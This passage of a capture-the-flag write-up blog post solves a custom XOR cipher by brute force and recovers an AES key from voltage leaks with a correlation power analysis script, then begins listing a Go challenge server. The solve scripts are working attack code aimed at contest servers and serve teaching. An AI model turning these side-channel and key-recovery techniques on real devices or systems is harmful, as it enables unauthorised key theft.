style=&#34;color:#ae81ff&#34;&gt;\xd6\xfc\x15\x13\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\x8b\x0e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;R&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb3\xd6\xcd\xef\x92\xa1\xa3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\xdb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{DE&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p4{&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# known flag format&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ind &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(flag) &lt;span style=&#34;color:#75715e&#34;&gt;# index we are brute forcing at&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cs:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flag&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;bytes([c])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        encrypted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; my_crypto(text,temp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ciphertext[ind] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; encrypted[ind]:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            flag&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;bytes([c])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ind&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;found char &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;bytes([c])&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, current flag: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running this, we slowly but surely recover the full flag: &lt;code&gt;p4{It_4ls0_pu1ls_0ut_rodeNts_with_ITs_pawsFromShallowBurrows.}&lt;/code&gt;&lt;/p&gt;
+
+  &lt;img src=&#34;./img/pallas-solve.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;
+
+
+&lt;p&gt;Full solve script:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve.py&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+from pwn import *
+
+#from sec import secret
+#print(len(secret))
+
+text   = b&amp;#34;The Pallas&amp;#39;s cat is a highly specialised predator of small mammals, which it catches by stalking or ambushing near exits of burrows.&amp;#34;
+
+def bits_to_bytes(l):
+	l = [str(f) for f in l]
+	l=&amp;#34;&amp;#34;.join(l)
+	final = [l[i * 8:(i &amp;#43; 1) * 8] for i in range((len(l) &amp;#43; 8 - 1) // 8 )]
+	final = [int(x,2) for x in final]
+	return bytes(final)
+
+def bytes_to_bits(bb):
+	r = &amp;#34;&amp;#34;
+	for c in bb:
+		r &amp;#43;= bin(c)[2:].rjust(8,&amp;#34;0&amp;#34;)
+	r= list(map(int, r))
+	return r
+
+def my_crypto_inner(text, secret):
+	tl = len(text)
+	sl = len(secret)
+	enc = [0]*len(text)
+	for i in range(tl):
+		enc[i]=text[i]
+		enc[i]^=secret[i % sl]
+		for div in range(1, tl):
+			if i%div == 0:
+				enc[i] ^= enc[(i-div) % sl]
+			if i&amp;gt;0 and div%i == 0:
+				enc[i] ^= text[(i-div) % sl]
+	return enc
+
+def my_crypto(text, secret):
+	text = bytes_to_bits(text)
+	secret = bytes_to_bits(secret)
+	res = my_crypto_inner(text,secret)
+	return bits_to_bytes(res)
+
+import string
+
+cs = string.ascii_letters &amp;#43; string.digits &amp;#43; &amp;#34;{}_!@#$%^&amp;amp;*(),./&amp;#34;
+cs = cs.encode()
+
+ciphertext = b&amp;#39;_\xce\x80^\x86\x8b\xbe\x00\x15I\xa7]\x86M\x1f\xe8\x87\x8e\xa3\xec_\x8d\x8a\xbd\xd4\xe7\x923\xa1\x8cw\x15F\x06\x8a\xa87\xa6\xcd)/\xaf\xce\xbc\x90go\xc4\r(\xac\xb1ng\xd5\x88\\\x07\xa9z\\G\x8d\xc2\x9f\x9c\x89\xf8r\x87Ut\xf5\xdc\xdda9\xe0\xc5\xa0G\xb8\xf6\xbe\n\xb1\xd0\xdc-\xd6\xfc\x15\x13\xbf}\xbf5\xb0S\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba3\xd8\x8b\x0eR\x87$\xb3\xd6\xcd\xef\x92\xa1\xa3|\xb4-\n\xdbw\x86{DE&amp;#39;
+
+flag = b&amp;#34;p4{&amp;#34; # known flag format
+ind = len(flag) # index we are brute forcing at
+while True:
+    for c in cs:
+        temp = flag&amp;#43;bytes([c])
+        encrypted = my_crypto(text,temp.ljust(62,b&amp;#34;?&amp;#34;))
+        if ciphertext[ind] == encrypted[ind]:
+            flag&amp;#43;=bytes([c])
+            ind&amp;#43;=1
+            print(f&amp;#34;found char {bytes([c]).decode()}, current flag: {flag.decode()}&amp;#34;)
+            break
+    else:
+	    break
+
+print(flag.decode())
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;h1 id=&#34;aes_observed-crypto---6-solves&#34;&gt;aes_observed (crypto) - 6 solves&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We have managed to get a person near our enemies encryption box.&lt;br&gt;
+He actions are limited but he can run some encryptions for us and percsely measure voltage just after sbox.&lt;br&gt;
+Can we do something with this information that would help us to recover some other plaintexts?&lt;br&gt;
+HINT: the Key is a flag.&lt;br&gt;
+&lt;code&gt;nc aes-observed.zajebistyc.tf 9999&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We are only given a server to connect to, which responds with 50 plaintext to voltage pairs.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Plaintext                                                        Voltage
+78a41912ae910166f57e6f1a46df63ee3a434860e116f5343d111181e657cc5c 2.512
+5f55d8fdb3ab5881554eadda588587c053f32b3abf282557b8dff50d03d5656a 2.418
+etc...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The challenge name &lt;code&gt;aes_observed&lt;/code&gt; hints to these plaintexts being encrypted with AES, and the given voltage suggests we need to perform an AES &lt;a href=&#34;https://en.wikipedia.org/wiki/Side-channel_attack&#34;&gt;side-channel attack&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;There are 2 main side channel attacks given voltages for RSA - Differential Power Analysis (DPA) and Correlation Power Analysis (CPA). To be honest, I have absolutely no idea how to perform these attacks.&lt;/p&gt;
+&lt;p&gt;However, I remembered that in PicoCTF 2023 there was a very similar challenge series named &lt;code&gt;Power Analysis&lt;/code&gt;, which also featured RSA side-channel attacks.&lt;/p&gt;
+&lt;p&gt;Searching for writeups on it, I found &lt;a href=&#34;https://eshard.com/posts/pico-ctf-power-analysis-challenges&#34;&gt;this article&lt;/a&gt;, where their writeup for &lt;code&gt;PowerAnalysis: Part 1&lt;/code&gt; proved to be extremely helpful.&lt;/p&gt;
+
+  &lt;img src=&#34;./img/cpa-blog.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;
+
+
+&lt;p&gt;There are a few differences between that challenge and the one we are trying to solve:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;we are given less samples (50 instead of 500)&lt;/li&gt;
+&lt;li&gt;the plaintexts are longer (32 bytes instead of 16)&lt;/li&gt;
+&lt;li&gt;the key we are trying to recover is longer (also 32 bytes instead of 16), but I didn&amp;rsquo;t know this until later on&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can easily solve the first issue by connecting multiple times to the server and gathering a large number of samples, and for the second issue, since AES block sizes are usually 16 bytes, I simply cut off the last 16 bytes of the 32 bytes for now.&lt;/p&gt;
+&lt;p&gt;Here is the code to collect the samples:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;plaintexts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;leaks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aes-observed.zajebistyc.tf&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        resp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        pt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromhex(resp[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#75715e&#34;&gt;# only consider first 16 bytes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; float(resp[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        arr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [v &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; v &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; pt]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        plaintexts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(arr))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        leaks&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append([leak,leak]) &lt;span style=&#34;color:#75715e&#34;&gt;# has to be in this format for the attack&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We collect 10000 samples in total, which should be sufficient to perform the attack and recover the key.&lt;/p&gt;
+&lt;p&gt;Next, we perform the CPA attack in the exact same way as the article.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ths &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read_ths_from_ram(samples&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(leaks), plaintext&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(plaintexts))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;attack &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CPAAttack(selection_function&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;selection_functions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encrypt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FirstSubBytes(), 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                          model&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Monobit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;), 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                          discriminant&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nanmax,  &lt;span style=&#34;color:#75715e&#34;&gt;# Positive correlation expected&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                          convergence_step&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;attack&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run(scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Container(ths))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;found_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nanargmax(attack&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;scores, axis&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;astype(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uint8&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(found_key)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Combining the code and running it, we recover the key in decimal format: &lt;code&gt;[112  52 123  79 115  99 105 108 108 111 115  99 111 112 101 115]&lt;/code&gt;. A quick from decimal in CyberChef gives us the flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;p4{Oscilloscopes
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However, it doesn&amp;rsquo;t seem to be the full flag. We assumed at the start that the key size is 16 bytes as it is the most common key size, but AES keys can actually be 16, 24 or 32 bytes.&lt;/p&gt;
+&lt;p&gt;Remembering that we neglected the last 16 bytes of the plaintext, we re-run the script - this time, only considering the last 16 bytes of the plaintext.&lt;/p&gt;
+&lt;p&gt;We simply modify the line &lt;code&gt;pt = bytes.fromhex(resp[0])[:16]&lt;/code&gt; to &lt;code&gt;[16:]&lt;/code&gt; to do so.&lt;/p&gt;
+&lt;p&gt;This works as we recover the last 16 bytes of the key, which is &lt;code&gt;? Still_matter!}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The full flag we get is &lt;code&gt;p4{Oscilloscopes? Still_matter!}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Full cleaned solve script:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;3&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve.py&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+from pwn import *
+
+import numpy as np
+from tqdm.notebook import tqdm
+from estraces import read_ths_from_ram
+import scared
+
+plaintexts1 = []
+plaintexts2 = []
+leaks = [] # voltage
+
+for _ in range(200):
+    r = remote(&amp;#34;aes-observed.zajebistyc.tf&amp;#34;,9999)
+    r.recvline()
+    for i in range(50):
+        resp = r.recvline().strip().decode().split(&amp;#34;\t&amp;#34;)
+        pt1 = bytes.fromhex(resp[0])[:16]
+        pt2 = bytes.fromhex(resp[0])[16:]
+        leak = float(resp[1])
+        arr = [v for v in pt1]
+        plaintexts1.append(np.array(arr))
+        arr = [v for v in pt2]
+        plaintexts2.append(np.array(arr))
+        leaks.append([leak,leak]) # has to be in this format for the attack
+    r.close()
+
+# Run attack for first 16 bytes of key
+ths = read_ths_from_ram(samples=np.array(leaks), plaintext=np.array(plaintexts1))
+attack = scared.CPAAttack(selection_function=scared.aes.selection_functions.encrypt.FirstSubBytes(), 
+                          model=scared.Monobit(0), 
+                          discriminant=scared.nanmax,  # Positive correlation expected
+                          convergence_step=50)
+attack.run(scared.Container(ths))
+
+found_key = np.nanargmax(attack.scores, axis=0).astype(&amp;#39;uint8&amp;#39;)
+
+print(found_key)
+
+# Run attack for last 16 bytes of key
+ths = read_ths_from_ram(samples=np.array(leaks), plaintext=np.array(plaintexts2))
+attack = scared.CPAAttack(selection_function=scared.aes.selection_functions.encrypt.FirstSubBytes(), 
+                          model=scared.Monobit(0), 
+                          discriminant=scared.nanmax,  # Positive correlation expected
+                          convergence_step=50)
+attack.run(scared.Container(ths))
+
+found_key = np.nanargmax(attack.scores, axis=0).astype(&amp;#39;uint8&amp;#39;)
+
+print(found_key)
+
+# p4{Oscilloscopes? Still_matter!}
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;h1 id=&#34;pepega-packets-misc---5-solves&#34;&gt;Pepega Packets (misc) - 5 solves&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Can you be faster enough?&lt;br&gt;
+&lt;code&gt;http://10.0.XXX.2:80&lt;/code&gt;&lt;br&gt;
+NOTE: Every team have separate ip address, please look on your paper from sanity check :)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This is probably the hardest I&amp;rsquo;ve ever cheese&amp;rsquo;d a challenge - and it was first blood as well&amp;hellip;&lt;/p&gt;
+&lt;p&gt;We are given the server&amp;rsquo;s code:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;4&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;go&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;server.go&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-go&#34; &gt;&lt;code&gt;
+package main
+
+import (
+	&amp;#34;context&amp;#34;
+	&amp;#34;errors&amp;#34;
+	&amp;#34;fmt&amp;#34;
+	&amp;#34;github.com/florianl/go-nflog&amp;#34;
+	&amp;#34;github.com/ghedo/go.pkt/layers&amp;#34;
+	&amp;#34;github.com/ghedo/go.pkt/packet&amp;#34;
+	&amp;#34;github.com/ghedo/go.pkt/packet/ipv4&amp;#34;
+	&amp;#34;github.com/ghedo/go.pkt/packet/tcp&amp;#34;
+	&amp;#34;log&amp;#34;
+	&amp;#34;net&amp;#34;
+	&amp;#34;net/http&amp;#34;
+	&amp;#34;os&amp;#34;
+	&amp;#34;os/exec&amp;#34;
+	&amp;#34;strconv&amp;#34;
+	&amp;#34;strings&amp;#34;
+	&amp;#34;sync&amp;#34;
+	&amp;#34;syscall&amp;#34;
+	&amp;#34;time&amp;#34;
+)
+
+type PacketInfo struct {
+	ArrivedAt time.Time
+
+	FromIP   net.IP
+	FromPort uint16
+
+	ToIP   net.IP
+	ToPort uint16
+}
+
+func GetPacketInfo(data []byte) (*PacketInfo, error) {
+	netPacket, err := layers.UnpackAll(data, packet.IPv4)
+	if err != nil {
+		return nil, err
+	}
+
+	ipInfo, ok := netPacket.(*ipv4.Packet)
+	if !ok {
+		return nil, errors.New(&amp;#34;not ip packet&amp;#34;)
+	}
+
+	tcpInfo, ok := netPacket.Payload().(*tcp.Packet)
+	if !ok {
+		return nil, errors.New(&amp;#34;not tcp packet&amp;#34;)
+	}
+
+	return &amp;amp;PacketInfo{
+		FromIP:   ipInfo.SrcAddr,
+		FromPort: tcpInfo.SrcPort,
+		ToIP:     ipInfo.DstAddr,
+		ToPort:   tcpInfo.DstPort,
+	}, nil
+}
+
+func GetPacketStream() (chan PacketInfo, error) {
+	ctx, cancel := context.WithCancel(context.Background())
+	config := nflog.Config{
+		Group:    nflogGroup,
+		Copymode: nflog.NfUlnlCopyPacket,
+		Bufsize:  64,
+		Logger:   log.New(os.Stderr, &amp;#34;nflog&amp;#34;, log.LstdFlags),
+	}
+
+	nf, err := nflog.Open(&amp;amp;config)
+	if err != nil {
+		cancel()
+		return nil, err
+	}
+
+	go func() {
+		&amp;lt;-ctx.Done()
+		nf.Close()
+	}()
+	packetStream := make(chan PacketInfo, 65000)
+
+	funcHook := func(msg nflog.Msg) int {
+		var packetData []byte
+		if msg, exists := msg[nflog.AttrPayload]; exists {
+			if msg, ok := msg.([]byte); ok {
+				packetData = msg
+			}
+		}
+
+		var packetTime time.Time
+		if msg, exists := msg[nflog.AttrTimestamp]; exists {
